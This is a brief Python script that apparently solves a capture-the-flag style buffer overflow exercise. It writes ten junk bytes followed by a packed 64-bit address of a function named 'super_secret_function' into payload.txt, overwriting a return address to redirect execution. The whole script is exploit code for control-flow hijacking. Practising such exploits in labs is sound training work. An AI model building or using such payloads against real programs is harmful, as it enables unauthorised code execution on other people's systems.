#! /usr/bin/env python

from struct import *

buf = ""
buf += "A"*10 #junk
buf += pack("<Q", 0x0000000000400807) #address of super_secret_function

f = open("payload.txt", "w")
f.write(buf)
